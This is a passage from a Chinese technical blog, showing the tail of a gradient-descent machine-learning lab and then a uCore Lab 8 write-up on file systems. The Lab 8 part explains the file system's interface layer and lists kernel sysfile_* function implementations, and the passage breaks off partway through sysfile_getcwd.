<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gradientDescent <span class="keyword">import</span> gradient_descent <span class="keyword">as</span> gd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 2.使用梯度下降法求解 ========</span></span><br><span class="line">theta_init = np.zeros(X.shape[<span class="number">1</span>])</span><br><span class="line">alpha = <span class="number">0.05</span></span><br><span class="line">num_iters = <span class="number">300</span></span><br><span class="line"></span><br><span class="line">theta,J_history = gd(X,Y,theta_init,alpha,num_iters) <span class="comment"># 利用梯度下降法进行优化求解,返回记录代价历史值的J_history,和最终θ(theta)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制&quot;迭代次数和代价函数值关系&quot;的图形</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(np.arange(J_history.size),J_history)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Number of iterations&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Cost J&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Theta computed from gradient descent : \n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(theta)) <span class="comment"># PS:theta是数组格式</span></span><br></pre></td></tr></table></figure>
<p>梯度下降算法和前面实现的一样，就不多赘述了，下面是“预测”的过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======== 3.预测 ========</span></span><br><span class="line">Xtest = np.array([<span class="number">1</span>,<span class="number">1650</span>,<span class="number">3</span>])</span><br><span class="line">price = np.dot(Xtest,np.transpose(theta))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Predicted price of a 1650 sq-ft, 3 br house (using normal equations) : &#123;:0.3f&#125;&#x27;</span>.<span class="built_in">format</span>(price))</span><br></pre></td></tr></table></figure>
<p>结构如下：</p>
<img src="/2022/05/05/Machine-Learning-Lab1/1651758783011-1652006179448.png" class width="1651758783011"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/03/Ucore-Lab8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/03/Ucore-Lab8/" class="post-title-link" itemprop="url">Ucore-Lab8</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-03 23:23:04" itemprop="dateCreated datePublished" datetime="2022-05-03T23:23:04+08:00">2022-05-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-10 19:25:09" itemprop="dateModified" datetime="2022-05-10T19:25:09+08:00">2022-05-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>38k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>34 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="文件系统和文件"><a href="#文件系统和文件" class="headerlink" title="文件系统和文件"></a>文件系统和文件</h2><p><strong>文件系统简述：</strong></p>
<p>文件系统是操作系统用于明确 “存储设备或分区上的文件” 的 “一组方法和数据结构”，是操作系统中负责管理和存储文件信息的软件机构（被称为文件管理系统，简称文件系统）</p>
<ul>
<li>注意：文件系统是对应硬盘的分区的，而不是整个硬盘，不管是硬盘只有一个分区，还是几个分区，不同的分区可以有着不同的文件系统</li>
</ul>
<p><strong>文件系统由三部分组成：</strong></p>
<ul>
<li>文件系统的接口层（用于对文件系统进行操作的一系列函数）</li>
<li>文件系统抽象层（“对象操纵和管理” 软件的集合）</li>
<li>对象及属性</li>
</ul>
<p>从系统角度来看，文件系统是对文件存储设备的空间进行组织和分配，负责文件存储并对存入的文件进行保护和检索的系统，具体地说，它负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等，文件系统是软件系统的一部分，它的存在使得应用可以方便的使用抽象命名的数据对象和大小可变的空间</p>
<ul>
<li>比如桌面上的各种文件：操作系统提供了一种抽象来控制管理这些文件，可以是图形界面，也可以是命令行，这些抽象可以让我们忽略一些底层的原理，免去了大量复杂的操作</li>
</ul>
<p><strong>文件系统的功能：</strong></p>
<ul>
<li>管理和调度文件的存储空间，提供文件的逻辑结构、物理结构和存储方法</li>
<li>实现文件从标识到实际地址的映射，实现文件的控制操作和存取操作，实现文件信息的共享并提供可靠的文件保密和保护措施，提供文件的安全措施</li>
</ul>
<h2 id="文件系统-访问接口层"><a href="#文件系统-访问接口层" class="headerlink" title="文件系统-访问接口层"></a>文件系统-访问接口层</h2><p>下面就是在内核中通用的文件相关函数（上层的文件系统需要的系统调用），同时也是我们在uCore中最常使用的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags)</span></span>;    <span class="comment">// 打开或创建一个文件</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;                                  <span class="comment">// 关闭一个打开的vnode</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len)</span></span>;               <span class="comment">// 读-Read file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len)</span></span>;              <span class="comment">// 写-Write file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_seek</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> pos, <span class="keyword">int</span> whence)</span></span>;                <span class="comment">// 查找-Seek file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_fstat</span><span class="params">(<span class="keyword">int</span> fd, struct stat *stat)</span></span>;                   <span class="comment">// 统计-Stat file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_fsync</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;                                      <span class="comment">// 同步-Sync file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_chdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span>;                      <span class="comment">// 改变DIR(页目录表)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_mkdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span>;                      <span class="comment">// 创建DIR(页目录表)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_link</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path1, <span class="keyword">const</span> <span class="keyword">char</span> *path2)</span></span>;         <span class="comment">// 设置path1的链接设置为path2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_rename</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path1, <span class="keyword">const</span> <span class="keyword">char</span> *path2)</span></span>;       <span class="comment">// 重命名文件</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_unlink</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span>;                           <span class="comment">// 取消path的链接</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_getcwd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span>;                      <span class="comment">// 获取当前工作目录</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_getdirentry</span><span class="params">(<span class="keyword">int</span> fd, struct dirent *direntp)</span></span>;        <span class="comment">// 在DIR中获取文件条目</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_dup</span><span class="params">(<span class="keyword">int</span> fd1, <span class="keyword">int</span> fd2)</span></span>;                              <span class="comment">// 复制文件</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_pipe</span><span class="params">(<span class="keyword">int</span> *fd_store)</span></span>;                                <span class="comment">// 建造管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_mkfifo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint32_t</span> open_flags)</span></span>;      <span class="comment">// 生成命名管道</span></span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_open：打开或创建一个文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__path, <span class="keyword">uint32_t</span> open_flags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">if</span> ((ret = copy_path(&amp;path, __path)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = file_open(path, open_flags);</span><br><span class="line">    kfree(path);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_close：关闭一个打开的vnode</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_close</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_read：读文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!file_testfd(fd, <span class="number">1</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> *buffer;</span><br><span class="line">    <span class="keyword">if</span> ((buffer = kmalloc(IOBUF_SIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> copied = <span class="number">0</span>, alen;</span><br><span class="line">    <span class="keyword">while</span> (len != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((alen = IOBUF_SIZE) &gt; len) &#123;</span><br><span class="line">            alen = len;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = file_read(fd, buffer, alen, &amp;alen);</span><br><span class="line">        <span class="keyword">if</span> (alen != <span class="number">0</span>) &#123;</span><br><span class="line">            lock_mm(mm);</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (copy_to_user(mm, base, buffer, alen)) &#123;</span><br><span class="line">                    assert(len &gt;= alen);</span><br><span class="line">                    base += alen, len -= alen, copied += alen;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">                    ret = -E_INVAL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            unlock_mm(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span> || alen == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    kfree(buffer);</span><br><span class="line">    <span class="keyword">if</span> (copied != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> copied;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_write：写文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!file_testfd(fd, <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> *buffer;</span><br><span class="line">    <span class="keyword">if</span> ((buffer = kmalloc(IOBUF_SIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> copied = <span class="number">0</span>, alen;</span><br><span class="line">    <span class="keyword">while</span> (len != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((alen = IOBUF_SIZE) &gt; len) &#123;</span><br><span class="line">            alen = len;</span><br><span class="line">        &#125;</span><br><span class="line">        lock_mm(mm);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!copy_from_user(mm, buffer, base, alen, <span class="number">0</span>)) &#123;</span><br><span class="line">                ret = -E_INVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unlock_mm(mm);</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">            ret = file_write(fd, buffer, alen, &amp;alen);</span><br><span class="line">            <span class="keyword">if</span> (alen != <span class="number">0</span>) &#123;</span><br><span class="line">                assert(len &gt;= alen);</span><br><span class="line">                base += alen, len -= alen, copied += alen;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span> || alen == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    kfree(buffer);</span><br><span class="line">    <span class="keyword">if</span> (copied != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> copied;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_seek：寻找文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_seek</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> pos, <span class="keyword">int</span> whence)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_seek(fd, pos, whence);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_fstat：统计文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_fstat</span><span class="params">(<span class="keyword">int</span> fd, struct stat *__stat)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> __<span class="title">local_stat</span>, *<span class="title">stat</span> =</span> &amp;__local_stat;</span><br><span class="line">    <span class="keyword">if</span> ((ret = file_fstat(fd, stat)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lock_mm(mm);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!copy_to_user(mm, __stat, stat, <span class="keyword">sizeof</span>(struct stat))) &#123;</span><br><span class="line">            ret = -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlock_mm(mm);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_fsync：同步文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_fsync</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_fsync(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_chdir：改变DIR(页目录表) </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_chdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">if</span> ((ret = copy_path(&amp;path, __path)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = vfs_chdir(path);</span><br><span class="line">    kfree(path);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_mkdir：创建DIR(页目录表)，ucore没有该接口，它采用另一种方式实现</li>
<li>sysfile_link：设置path1的链接设置为path2</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_link</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__path1, <span class="keyword">const</span> <span class="keyword">char</span> *__path2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> *old_path, *new_path;</span><br><span class="line">    <span class="keyword">if</span> ((ret = copy_path(&amp;old_path, __path1)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((ret = copy_path(&amp;new_path, __path2)) != <span class="number">0</span>) &#123;</span><br><span class="line">        kfree(old_path);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = vfs_link(old_path, new_path);</span><br><span class="line">    kfree(old_path), kfree(new_path);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_rename：重命名文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_rename</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__path1, <span class="keyword">const</span> <span class="keyword">char</span> *__path2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> *old_path, *new_path;</span><br><span class="line">    <span class="keyword">if</span> ((ret = copy_path(&amp;old_path, __path1)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((ret = copy_path(&amp;new_path, __path2)) != <span class="number">0</span>) &#123;</span><br><span class="line">        kfree(old_path);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = vfs_rename(old_path, new_path);</span><br><span class="line">    kfree(old_path), kfree(new_path);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_unlink：取消path的链接</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_unlink</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">if</span> ((ret = copy_path(&amp;path, __path)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = vfs_unlink(path);</span><br><span class="line">    kfree(path);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_getcwd：获取当前工作目录</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_getcwd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = -E_INVAL;</span><br><span class="line">    lock_mm(mm);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (user_mem_check(mm, (<span class="keyword">uintptr_t</span>)buf, len, <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">iobuf</span> __<span class="title">iob</span>, *<span class="title">iob</span> =</span> iobuf_init(&amp;__iob, buf, len, <span 